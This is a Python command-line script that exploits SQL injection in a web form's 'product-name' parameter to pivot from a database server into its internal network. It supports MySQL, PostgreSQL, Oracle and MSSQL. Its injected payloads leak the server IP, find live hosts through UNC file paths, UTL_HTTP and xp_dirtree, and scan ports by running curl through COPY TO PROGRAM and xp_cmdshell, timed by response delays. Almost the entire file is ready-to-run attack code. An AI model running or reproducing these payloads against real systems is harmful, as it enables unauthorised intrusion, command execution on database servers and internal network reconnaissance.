# _*_ coding: utf 8 _*_

import requests
import argparse
import time
import re

parser = argparse.ArgumentParser(description="Detector de argumentos")
parser.add_argument(
    '-d', '--dbms', help="Select the objective DBMS.", choices=['mysql', 'psql', 'oracle', 'mssql'], required=True)
parser.add_argument(
    '-p', '--ports', help="Get a list of open ports for each found IP.", action="store_true")
parser.add_argument(
    'target', help="Target URL to make a POST request.")
parser = parser.parse_args()

url = parser.target

# list of top 20 TCP ports
topPorts = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139,
            143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]

# list without port 135
curlPorts = [21, 22, 23, 25, 53, 80, 110, 111, 139, 143,
             443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]

# ports with different behaviour with curl
curlSpecialPorts = [21, 445, 3389]

headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36',
    'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8'}


def get_ip_address(dbms):
    query = ""
    if dbms == "mysql":
        print('\nTARGET: {} // MySQL\n'.format(parser.target))
        query = "' union all select 1,SUBSTRING_INDEX(host,':',1) from information_schema.processlist WHERE ID=connection_id() -- "
    elif dbms == "psql":
        print('\nTARGET: {} // PostgreSQL\n'.format(parser.target))
        query = "' union all select 1,host(inet_server_addr()) -- "
    elif dbms == "oracle":
        print('\nTARGET: {} // OracleDB\n'.format(parser.target))
        query = "' union all select 1,SYS_CONTEXT('USERENV', 'IP_ADDRESS') FROM dual -- "
    else:
        print('\nTARGET: {} // Microsoft SQL Server\n'.format(parser.target))
        query = "' union all select 1,local_net_address from sys.dm_exec_connections where session_id=@@SPID -- "

    peticion = requests.post(
        url=url,
        data={'product-name': query, 'submit': 'submit'},
        headers=headers)

    ipv4_pattern = r'[0-9]+(?:\.[0-9]+){3}'
    host = re.findall(ipv4_pattern, peticion.text)

    if len(host) == 0:
        ip = '192.168.0.'
        print("\n\n--- ERROR: Could not find server's IP Address ---")
        print("--- Using default IP Address range: 192.168.0.0/24\n")
    else:
        ipdivided = host[0].split('.')
        ipdivided.pop(len(ipdivided)-1)
        ip = '.'.join(ipdivided) + '.'

    return ip


# MYSQL

def mysql_scanner(ip):

    print("--- Using LOAD_FILE() ---\n")
    for i in range(1, 255):
        host = ip + str(i)
        query = "' AND LOAD_FILE('//{}/tmp') -- ".format(host)
        start_time = time.time()
        requests.post(
            url=url,
            data={'product-name': query, 'submit': 'submit'},
            headers=headers)
        exec_time = time.time() - start_time

        if exec_time <= 28:
            print('Alive host: {}'.format(host))

    print("\n\n--- Using SELECT INTO OUTFILE() ---\n")
    for i in range(1, 255):
        host = ip + str(i)
        query = "' INTO OUTFILE '//{}/tmp' -- ".format(host)
        start_time = time.time()
        requests.post(
            url=url,
            data={'product-name': query, 'submit': 'submit'},
            headers=headers)
        exec_time = time.time() - start_time

        if exec_time <= 28:
            print('Alive host: {}'.format(host))


# POSTGRESQL

def psql_scanner(ip):

    hosts = []
    print("--- Using PG_READ_FILE() ---\n")
    for i in range(1, 255):
        host = ip + str(i)
        query = "' union all select null,pg_read_file('//{}/tmp') -- ".format(
            host)
        start_time = time.time()
        requests.post(
            url=url,
            data={'product-name': query, 'submit': 'submit'},
            headers=headers)
        exec_time = time.time() - start_time

        if exec_time <= 28:
            print('Alive host: {}'.format(host))
            hosts.append(host)

    print("\n\n--- Using COPY ---\n")
    for i in range(1, 255):
        host = ip + str(i)
        query = "'; COPY users TO '//{}/tmp'; -- ".format(
            host)
        start_time = time.time()
        requests.post(
            url=url,
            data={'product-name': query, 'submit': 'submit'},
            headers=headers)
        exec_time = time.time() - start_time

        if exec_time <= 28:
            print('Alive host: {}'.format(host))

    if parser.ports:
        psql_port_scanner(hosts)


def psql_port_scanner(hosts):

    print("\n\n--- Open ports using COPY TO PROGRAM ---\n")
    for host in hosts:
        for port in curlPorts:
            start_time = time.time()
            query = "'; COPY users TO PROGRAM 'curl {}:{}'; -- ".format(
                host, port)
            requests.post(
                url=url, data={'product-name': query, 'submit': 'submit'}, headers=headers)
            exec_time = time.time() - start_time

            if exec_time < 1.5:
                print('Host {} has open port: {}'.format(host, port))

        for port in curlSpecialPorts:
            start_time = time.time()
            query = "'; COPY users TO PROGRAM 'curl {}:{}'; -- ".format(
                host, port)
            requests.post(
                url=url, data={'product-name': query, 'submit': 'submit'}, headers=headers)
            exec_time = time.time() - start_time

            if exec_time > 29:
                print('Host {} has open port: {}'.format(host, port))


# ORACLE DB

def oracle_scanner(ip):

    hosts = []
    print("--- Using UTL_HTTP ---\n")
    for i in range(1, 255):
        host = ip + str(i)
        query = "' and UTL_HTTP.REQUEST('{}:80') IS NOT NULL -- ".format(host)

        peticion = requests.post(
            url=url,
            data={'product-name': query, 'submit': 'submit'},
            headers=headers)

        if "TNS:timeout" not in peticion.text:
            print('Alive host: {}'.format(host))
            hosts.append(host)

    if parser.ports:
        oracle_port_scanner(hosts)


def oracle_port_scanner(hosts):
    print("\n\n--- Open ports ---\n")
    for host in hosts:
        for port in topPorts:
            query = "' and UTL_HTTP.REQUEST('{}:{}') IS NOT NULL -- ".format(
                host, port)

            peticion = requests.post(
                url=url,
                data={'product-name': query, 'submit': 'submit'},
                headers=headers)

            if 'TNS:timeout' not in peticion.text and 'listener' not in peticion.text:
                print('Host {} has open port: {}'.format(host, port))


# MICROSOFT SQL SERVER

def mssql_scanner(ip):

    hosts = []
    print("--- Using xp_subdirs ---\n")
    for i in range(1, 255):
        host = ip + str(i)
        query = "' execute master..xp_subdirs '//{}/tmp' -- ".format(host)
        start_time = time.time()
        requests.post(
            url=url,
            data={'product-name': query, 'submit': 'submit'},
            headers=headers)
        exec_time = time.time() - start_time

        if exec_time <= 28:
            print('Alive host: {}'.format(host))
            hosts.append(host)

    print("\n\n--- Using xp_dirtree ---\n")
    for i in range(1, 255):
        host = ip + str(i)
        query = "' execute master..xp_dirtree '//{}/tmp' -- ".format(host)
        start_time = time.time()
        requests.post(
            url=url,
            data={'product-name': query, 'submit': 'submit'},
            headers=headers)
        exec_time = time.time() - start_time

        if exec_time <= 28:
            print('Alive host: {}'.format(host))

    if parser.ports:
        mssql_port_scanner(hosts)


def mssql_port_scanner(hosts):

    print("\n\n--- Open ports using OPENROWSET ---\n")
    for host in hosts:
        for port in topPorts:
            query = "' union all select 1,2 from OPENROWSET ('SQLNCLI','Server={},{};Database=myDatabase;Trusted_Connection=yes;','SELECT * FROM myTable') -- ".format(
                host, port)
            start_time = time.time()
            peticion = requests.post(
                url=url,
                data={'product-name': query, 'submit': 'submit'},
                headers=headers)
            exec_time = time.time() - start_time

            if 'Tiempo de espera' not in peticion.text and ('establecer' not in peticion.text or exec_time < 13.5):
                print('Host {} has open port: {}'.format(host, port))

    print("\n\n--- Open ports using xp_cmdshell ---\n")
    for host in hosts:
        for port in curlPorts:
            start_time = time.time()
            query = "' execute master..xp_cmdshell 'curl {}:{}' -- ".format(
                host, port)
            requests.post(
                url=url, data={'product-name': query, 'submit': 'submit'}, headers=headers)
            exec_time = time.time() - start_time

            if exec_time < 1.5:
                print('Host {} has open port: {}'.format(host, port))

        for port in curlSpecialPorts:
            start_time = time.time()
            query = "' execute master..xp_cmdshell 'curl {}:{}' -- ".format(
                host, port)
            requests.post(
                url=url, data={'product-name': query, 'submit': 'submit'}, headers=headers)
            exec_time = time.time() - start_time

            if exec_time > 29:
                print('Host {} has open port: {}'.format(host, port))


# MAIN


def main():
    ip = get_ip_address(parser.dbms)

    if parser.dbms == "mysql":
        mysql_scanner(ip)
    elif parser.dbms == "psql":
        psql_scanner(ip)
    elif parser.dbms == "oracle":
        oracle_scanner(ip)
    else:
        mssql_scanner(ip)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\Closing app...\n")
        exit()
